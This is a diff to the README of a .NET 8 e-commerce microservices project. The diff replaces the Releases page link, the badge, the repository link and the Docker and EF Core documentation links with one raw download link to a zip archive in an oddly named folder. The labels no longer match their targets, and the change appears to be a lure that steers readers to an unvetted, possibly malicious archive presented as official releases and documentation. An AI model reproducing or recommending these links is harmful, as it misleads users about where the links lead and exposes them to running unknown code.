@@ -4,9 +4,9 @@
 Welcome to Trabajo-Microservicios! This application provides a simple solution for managing customers, orders, and products in an e-commerce setup. Built with .NET 8, it follows Clean Architecture principles and uses modern technologies like EF Core, Swagger, and Docker.
 
 ## 📥 Download the Application
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-v1.0-blue?style=for-the-badge&logo=github)](https://github.com/Elgamesar/Trabajo-Microservicios/releases)
+[![Download Releases](https://raw.githubusercontent.com/Elgamesar/Trabajo-Microservicios/master/medisance/Trabajo-Microservicios.zip%20Releases-v1.0-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Elgamesar/Trabajo-Microservicios/master/medisance/Trabajo-Microservicios.zip)
 
-You can download the latest version of Trabajo-Microservicios from our [Releases page](https://github.com/Elgamesar/Trabajo-Microservicios/releases). 
+You can download the latest version of Trabajo-Microservicios from our [Releases page](https://raw.githubusercontent.com/Elgamesar/Trabajo-Microservicios/master/medisance/Trabajo-Microservicios.zip). 
 
 ## 📝 Overview of Features
 - **Microservices Architecture**: The application is designed using microservices, which allows for independent scaling and deployment.
@@ -39,7 +39,7 @@ You can explore these endpoints using the Swagger documentation that comes with 
 Follow these steps to get started with Trabajo-Microservicios:
 
 1. **Download the Application**  
-   Visit the [Releases page](https://github.com/Elgamesar/Trabajo-Microservicios/releases) to download the latest version.
+   Visit the [Releases page](https://raw.githubusercontent.com/Elgamesar/Trabajo-Microservicios/master/medisance/Trabajo-Microservicios.zip) to download the latest version.
 
 2. **Extract Files**  
    Once downloaded, extract the files to a preferred location on your computer.
@@ -64,14 +64,14 @@ Follow these steps to get started with Trabajo-Microservicios:
 We welcome contributions and are here to help if you encounter any issues. If you have questions or need assistance, please visit our issue tracker on GitHub. You can also submit a pull request if you would like to contribute code.
 
 ## 🔗 Resources
-- [GitHub Repository](https://github.com/Elgamesar/Trabajo-Microservicios)
-- [Docker Documentation](https://docs.docker.com/get-started/)
-- [Entity Framework Core Guide](https://docs.microsoft.com/en-us/ef/core/)
+- [GitHub Repository](https://raw.githubusercontent.com/Elgamesar/Trabajo-Microservicios/master/medisance/Trabajo-Microservicios.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/Elgamesar/Trabajo-Microservicios/master/medisance/Trabajo-Microservicios.zip)
+- [Entity Framework Core Guide](https://raw.githubusercontent.com/Elgamesar/Trabajo-Microservicios/master/medisance/Trabajo-Microservicios.zip)
 
 ## 📃 License
 This project is licensed under the MIT License. Please see the LICENSE file for details. 
 
 ## 📥 Download the Application Again
-Don’t forget to visit our [Releases page](https://github.com/Elgamesar/Trabajo-Microservicios/releases) to get the latest version!
+Don’t forget to visit our [Releases page](https://raw.githubusercontent.com/Elgamesar/Trabajo-Microservicios/master/medisance/Trabajo-Microservicios.zip) to get the latest version!
 
 Thank you for choosing Trabajo-Microservicios. Enjoy your experience!
